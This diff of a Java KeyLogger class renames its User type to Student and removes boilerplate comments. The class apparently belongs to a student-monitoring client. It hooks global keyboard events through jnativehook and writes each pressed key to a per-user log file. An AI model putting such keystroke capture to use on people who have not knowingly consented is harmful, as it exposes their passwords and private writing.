@@ -1,6 +1,6 @@
 package logger;
 
-import client.User;
+import client.Student;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
@@ -12,10 +12,10 @@ import java.util.logging.Logger;
 
 public class KeyLogger implements NativeKeyListener {
 
-    final User user;
+    final Student user;
     KeyLoggerFile kf;
 
-    public KeyLogger(User user) {
+    public KeyLogger(Student user) {
         this.user = user;
         kf = new KeyLoggerFile(user);
 
@@ -36,28 +36,19 @@ public class KeyLogger implements NativeKeyListener {
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent key) {
-        // throw new UnsupportedOperationException("Not supported yet.");r //To change
-        // body of generated methods, choose Tools | Templates.
-
     }
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent key) {
-        // throw new UnsupportedOperationException("Not supported yet."); //To change
-        // body of generated methods, choose Tools | Templates.
         CharSequence text = NativeKeyEvent.getKeyText(key.getKeyCode()) + "\n";
         try {
             kf.keyLoggerWriter(text);
         } catch (IOException e) {
             e.printStackTrace();
         }
-//        System.out.println("KEY : "+text);
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent key) {
-        // throw new UnsupportedOperationException("Not supported yet."); //To change
-        // body of generated methods, choose Tools | Templates.
-        // System.out.println("Released : " + NativeKeyEvent.getKeyText(key.getKeyCode()));
     }
 }
